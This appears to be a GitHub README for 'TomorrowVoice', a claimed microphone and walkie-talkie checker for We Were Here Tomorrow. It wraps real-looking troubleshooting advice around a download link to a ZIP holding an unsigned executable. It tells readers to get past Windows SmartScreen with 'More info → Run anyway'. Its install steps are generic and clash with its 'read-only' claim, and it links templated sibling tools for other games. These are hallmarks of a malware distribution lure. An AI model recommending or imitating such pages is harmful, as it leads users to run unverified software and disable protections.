# We Were Here Tomorrow Voice Chat Not Working — Microphone and Walkie-Talkie

<p align="center">
  <img src="https://i.postimg.cc/D0JpzfzP/banner.png" alt="We Were Here Tomorrow — Voice Check for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Voice%20%26%20Mic%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-tomorrow--voice--1.6-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · We Were Here Tomorrow · Microphone and audio troubleshooting**

*We Were Here Tomorrow* relies on two players hearing each other. When the **walkie-talkie is silent**, there is no point changing random game files until you know whether Windows can record your microphone and whether the game has selected the correct device.

The developers listed an issue where audio input settings did not always stick when leaving the settings screen. They also patched a voice-reconnection problem in version 1.1.2 on 23 October. Those are different from a microphone that never worked, and the troubleshooting steps below reflect that.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Teammate hears game audio, but walkie-talkie is silent | Wrong Windows default input device or mic privacy blocked | Check Windows Sound Input & Privacy → Microphone permissions |
| Selected mic resets when leaving audio menu | Known input-setting persistence bug documented by developers | Update to Patch `1.1.2`+ and re-verify in-game device selection |
| Vivox voice fails to reconnect mid-session | Pre-1.1.2 Vivox reconnection issue or VPN/firewall block | Update to Patch `1.1.2` (Oct 23) and test without VPN |
| Headset exposes both 'Stereo' and 'Hands-Free AG' | Windows routing game mic through low-bandwidth Bluetooth profile | Set dedicated headset mic as Windows Default Communication Device |

## Download for Windows

[**Download TomorrowVoice.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/TomorrowVoice.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `TomorrowVoice.exe`? (Automatic checks in ~2 seconds)

- Lists all Windows recording (`AudioEndpoint`) devices and highlights the active Default Communication mic.
- Detects duplicate Bluetooth `Hands-Free AG` endpoints that frequently hijack in-game walkie-talkie audio.
- Verifies Windows desktop-app microphone privacy permissions.
- Performs non-invasive local checks without altering network ports or audio drivers.

### Sample Diagnostic Output

```text
[TomorrowVoice] Inspecting Windows microphone & Vivox audio readiness...
[OK]   Default Mic      : Yeti Nano USB Microphone [Status: OK, Sample Rate: 48000 Hz]
[WARN] Bluetooth Device : WH-1000XM5 Hands-Free AG Audio (Present - can hijack game input)
[OK]   Mic Privacy      : Desktop app microphone access = Allow
[INFO] Patch Reminder   : Ensure We Were Here Tomorrow v1.1.2+ is installed in Steam
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `TomorrowVoice.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **TomorrowVoice.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **TomorrowVoice.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- Your teammate can hear the game but not your voice.
- Voice chat stops after leaving an audio test or changing settings.
- The game uses a different input device from Windows.
- Walkie-talkie or voice server audio drops while other game sounds continue.

## Before changing anything

Update the game on Steam before testing older workarounds. In Windows Sound settings, select the headset microphone you actually use and verify the recording indicator responds. Confirm desktop-app microphone permission in Windows Privacy settings. If the headset exposes both hands-free and stereo devices, check which device the game has chosen.

Inside the game, set the expected microphone and recheck it after leaving and re-entering the audio menu, because developer documentation notes an input-setting persistence issue.

## What to check

Test both halves of the connection: have each player verify microphone input locally, then test together in a private session. If both microphones work in Windows but only one direction fails in the game, note whose voice drops and when. In-game and network voice components may fail separately from the co-op session itself.

The October 23 patch addressed a case where Vivox voice would not reconnect after a server interruption. Updating the game is more appropriate than applying outdated cache-deletion advice. If you are using a VPN or an unusual firewall arrangement, consult the developer's support checklist instead of opening arbitrary ports.

## What this project covers

The purpose is to help distinguish **We Were Here Tomorrow microphone issues**, **silent walkie-talkie**, incorrect device selection and voice-server trouble. A Windows-side utility cannot restore an unavailable third-party voice service or guarantee a stable internet route.

## Troubleshooting

### The mic works in Discord but not the game

Verify the selected in-game device rather than assuming Discord and the game use the same input.

### Voice stopped after a microphone test

Check current patch notes and reselect the microphone; the relevant voice issue has received fixes.

### Only one of two players is silent

Run the local recording test on both PCs and compare game settings independently.

## Frequently asked questions

**Does the program modify voice servers?**

No. Server-side voice availability is controlled by the game and its providers.

**Is restarting the game a permanent fix?**

No. It can be a useful isolation step, but persistent failure needs device or connection diagnosis.

**Does this require a headset?**

Any compatible input device can be checked, though a headset can reduce voice echo.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Developer: Known Issues and Solutions](https://support.totalmayhemgames.com/hc/en-us/articles/39905874848157-We-Were-Here-Tomorrow-KNOWN-ISSUES-SOLUTIONS)
- [Developer: Sound, Microphone and Walkie-Talkie](https://support.totalmayhemgames.com/hc/en-us/articles/34584077997725-My-sound-microphone-or-walkie-talkie-does-not-work-We-Were-Here-Tomorrow)
- [Steam Patch 1.1.2 (23 October)](https://steamdb.info/patchnotes/26158659/)

## More Windows Game Diagnostic Tools

- [ScamWithFriends-MicCheck](../ScamWithFriends-MicCheck) — Scam With Your Friends microphone & speech-recognition check
- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 co-op save & mod diagnostics
- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 co-op & dedicated server save guard
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers co-op world backup & version guard

## Disclaimer

This is an independent community project for We Were Here Tomorrow players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
